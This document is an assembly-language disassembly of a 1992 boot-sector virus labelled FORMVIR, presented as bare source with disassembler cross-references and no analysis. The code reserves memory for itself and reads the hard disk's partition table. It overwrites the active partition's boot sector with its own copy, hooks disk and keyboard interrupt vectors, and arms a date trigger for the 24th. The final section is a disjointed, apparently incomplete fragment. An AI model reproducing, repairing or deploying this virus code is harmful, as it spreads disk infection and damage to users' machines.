PAGE  59,132

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 FORMVIR                      ;;
;;;                                      ;;
;;;      Created:   12-Mar-92                            ;;
;;;      Version:                                ;;
;;;      Code type: zero start                           ;;
;;;      Passes:    9          Analysis Options on: QRS              ;;
;;;                                      ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.286c

data_1e     equ 413h            ; (0000:0413=280h)
data_2e     equ 7C00h           ; (0000:7C00=0BCh)
data_3e     equ 4Dh         ; (07C0:004D=3B36h)
data_4e     equ 4Fh         ; (07C0:004F=193Eh)
data_25e    equ 3F9h            ; (91B0:03F9=0)
data_26e    equ 1FEh            ; (A000:01FE=0FFh)

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 0

formvir     proc    far

start:
        jmp short loc_1     ; (0055)
        db  90h
data_5      dw  4547h           ;  xref 91B0:0192, 01BE
data_6      dw  574Fh           ;  xref 91B0:01CE, 01F9
        db   4Fh, 52h, 4Bh, 53h, 00h, 02h
data_7      db  2           ;  xref 91B0:01C7
        db  1, 0
data_8      db  2           ;  xref 91B0:01B7
data_9      dw  70h         ;  xref 91B0:01AC
data_10     dw  5A0h            ;  xref 91B0:01C1
        db  0F9h
data_11     dw  3           ;  xref 91B0:01B4
        db  9, 0, 2, 0
        db  8 dup (0)
        db   01h, 00h, 29h,0B7h, 26h, 00h
        db   00h
        db  '-R-        '

        db  8 dup (0)
        db  0E8h, 01h,0FEh
data_14     dd  0F0004520h      ;  xref 91B0:00A5, 01E5
data_15     db  87h         ;  xref 91B0:00BA
        db  0E9h, 00h,0F0h
data_16     dw  105h            ;  xref 91B0:00D8, 00F2, 0142
data_17     dw  100h            ;  xref 91B0:00DC, 00F6, 0146
data_18     dw  104h            ;  xref 91B0:0152
data_19     dw  100h            ;  xref 91B0:0156
data_20     dw  1           ;  xref 91B0:011E, 016E
data_21     dw  180h            ;  xref 91B0:0122, 016A
loc_1:                      ;  xref 91B0:0000
        cli             ; Disable interrupts
        xor ax,ax           ; Zero register
        mov ss,ax
        mov sp,7BFEh
        sti             ; Enable interrupts
        push    ds
        push    si
        push    dx
        push    ax
        pop es
        mov ax,7C0h
        mov ds,ax
        xor si,si           ; Zero register
        sub word ptr es:data_1e,2   ; (0000:0413=280h)
        mov ax,es:data_1e       ; (0000:0413=280h)
        mov cl,6
        shl ax,cl           ; Shift w/zeros fill
        mov es,ax
        xor di,di           ; Zero register
        mov cx,0FFh
        cld             ; Clear direction
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        push    es
        mov ax,9Ah
        push    ax
        mov bx,data_26e     ; (A000:01FE=0FFh)
        mov ax,201h
        mov cx,ds:data_3e       ; (07C0:004D=3B36h)
        mov dx,ds:data_4e       ; (07C0:004F=193Eh)
        int 13h         ; Disk  dl=drive ?  ah=func 02h
                        ;  read sectors to memory es:bx
loc_2:                      ;  xref 91B0:0097
        jc  loc_2           ; Jump if carry Set
        retf
        push    cs
        pop ds
        call    sub_1           ; (00CE)
        call    sub_2           ; (00E3)
        mov bx,4Ch
        mov si,offset data_14   ; (91B0:0041=20h)
        mov di,346h
        call    sub_3           ; (0175)
        mov ah,4
        int 1Ah         ; Real time clock   ah=func 04h
                        ;  read date cx=year, dx=mon/day
        cmp dl,18h
        jne loc_3           ; Jump if not equal
        mov bx,24h
        mov si,offset data_15   ; (91B0:0045=87h)
        mov di,35Dh
        call    sub_3           ; (0175)
loc_3:                      ;  xref 91B0:00B5
        pop dx
        pop si
        pop ds
        xor ax,ax           ; Zero register
        push    ax
        mov ax,7C00h
        push    ax
        retf                ; Return far

formvir     endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   91B0:009C
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_1       proc    near
        xor ax,ax           ; Zero register
        mov es,ax
        mov bx,data_2e      ; (0000:7C00=0BCh)
        mov ax,201h
        mov cx,data_16      ; (91B0:0049=105h)
        mov dx,data_17      ; (91B0:004B=100h)
        int 13h         ; Disk  dl=drive a  ah=func 02h
                        ;  read sectors to memory es:bx
        retn
sub_1       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   91B0:009F
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_2       proc    near
        push    cs
        pop es
        mov dl,80h
        mov ah,8
        mov bx,3F9h
        int 13h         ; Disk  dl=drive 0  ah=func 08h
                        ;  read parameters for drive dl
        jc  loc_4           ; Jump if carry Set
        mov dl,80h
        mov data_16,cx      ; (91B0:0049=105h)
        mov data_17,dx      ; (91B0:004B=100h)
        mov ax,201h
        mov cx,1
        xor dh,dh           ; Zero register
        int 13h         ; Disk  dl=drive 0  ah=func 02h
                        ;  read sectors to memory es:bx
loc_4:                      ;  xref 91B0:00EE
        jc  loc_ret_7       ; Jump if carry Set
        add bx,offset ds:[1BEh] ; (91B0:01BE=0A3h)
        mov cl,4

locloop_5:                  ;  xref 91B0:0114
        cmp byte ptr [bx],80h
        je  loc_6           ; Jump if equal
        add bx,10h
        loop    locloop_5       ; Loop if cx > 0

        jmp short loc_ret_7     ; (0174)
loc_6:                      ;  xref 91B0:010F
        mov dh,[bx+1]
        mov cx,[bx+2]
        mov data_20,cx      ; (91B0:0051=1)
        mov data_21,dx      ; (91B0:0053=180h)
        mov ax,201h
        mov bx,data_25e     ; (91B0:03F9=0)
        int 13h         ; Disk  dl=drive 0  ah=func 02h
                        ;  read sectors to memory es:bx
        jc  loc_ret_7       ; Jump if carry Set
        cmp word ptr [bx+3Fh],0FE01h
        nop             ;*ASM fixup - displacement
        je  loc_ret_7       ; Jump if equal
        cmp word ptr [bx+0Bh],200h
        jne loc_ret_7       ; Jump if not equal
        mov ax,301h
        mov cx,data_16      ; (91B0:0049=105h)
        mov dx,data_17      ; (91B0:004B=100h)
        int 13h         ; Disk  dl=drive a  ah=func 03h
                        ;  write sectors from mem es:bx
        jc  loc_ret_7       ; Jump if carry Set
        mov bx,offset ds:[1FEh] ; (91B0:01FE=55h)
        dec cx
        mov data_18,cx      ; (91B0:004D=104h)
        mov data_19,dx      ; (91B0:004F=100h)
        mov ax,301h
        int 13h         ; Disk  dl=drive a  ah=func 03h
                        ;  write sectors from mem es:bx
        jc  loc_ret_7       ; Jump if carry Set
        call    sub_4           ; (018F)
        mov bx,data_25e     ; (91B0:03F9=0)
        mov ax,301h
        mov dx,data_21      ; (91B0:0053=180h)
        mov cx,data_20      ; (91B0:0051=1)
        int 13h         ; Disk  dl=drive 0  ah=func 03h
                        ;  write sectors from mem es:bx

loc_ret_7:                  ;  xref 91B0:0104, 0116, 012E, 0136
                        ;            013D, 014C, 015F
        retn
sub_2       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   91B0:00AB, 00C0
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_3       proc    near
        xor ax,ax           ; Zero register
        mov es,ax
        mov ax,es:[bx]
        mov [si],ax
        mov ax,es:[bx+2]
        mov [si+2],ax
        cli             ; Disable interrupts
        mov es:[bx],di
        mov es:[bx+2],cs
        sti             ; Enable interrupts
        retn
sub_3       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   91B0:0161
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_4       proc    near
        mov si,data_25e     ; (91B0:03F9=0)
        mov di,offset data_5    ; (91B0:0003=47h)
        add si,di
        mov cx,3Ch
        cld             ; Clear direction
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        xor si,si           ; Zero register
        mov di,data_25e     ; (91B0:03F9=0)
        mov cx,0FFh
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        mov word ptr [di],0AA55h
        retn
sub_4       endp

        mov bx,data_9       ; (91B0:0011=70h)
        mov cl,4
        shl bx,cl           ; Shift w/zeros fill
        mov ax,data_11      ; (91B0:0016=3)
        mul data_8          ; (91B0:0010=2) ax = data * al
        add al,bh
        inc ax
        mov data_5,ax       ; (91B0:0003=4547h)
        mov bx,data_10      ; (91B0:0013=5A0h)
        sub bx,ax
        mov cl,data_7       ; (91B0:000D=2)
        dec cx
        shr bx,cl           ; Shift w/zeros fill
        mov data_6,bx       ; (91B0:0005=574Fh)
        retn
        mov cx,2
        mov di,8
        mov si,0Fh
        mov bx,3F9h
        xor dh,dh           ; Zero register
        mov ax,202h
        pushf               ; Push flags
        call    data_14         ; (91B0:0041=4520h)
        jc  $+75h           ; Jump if carry Set
        test    word ptr [bx+si],0FFFh
        jnz loc_8           ; Jump if not zero
        or  word ptr [bx+si],0FF7h
        jmp short $+2Dh
loc_8:                      ;  xref 91B0:01EF
        inc si
        inc di
        cmp di,data_6       ; (91B0:0005=574Fh)
        jae $+57h           ; Jump if above or =
        stosb               ; Store al to es:[di]
        mov word ptr ds:[5Fh],ax    ; (91B0:005F=5256h)

seg_a       ends



        end start

;;;;;;;;;;;;;;;;;;;; CROSS REFERENCE - KEY ENTRY POINTS ;;;;;;;;;;;;;;;;;;;

    seg:off    type    label
   ---- ----   ----   ---------------
   91B0:0000   far    start

 ;;;;;;;;;;;;;;;;;; Interrupt Usage Synopsis ;;;;;;;;;;;;;;;;;;

        Interrupt 13h :  read sectors to memory es:bx
        Interrupt 13h :  write sectors from mem es:bx
        Interrupt 13h :  read parameters for drive dl
        Interrupt 1Ah :  read date cx=year, dx=mon/day

 ;;;;;;;;;;;;;;;;;; I/O Port Usage Synopsis  ;;;;;;;;;;;;;;;;;;

        No I/O ports used.
        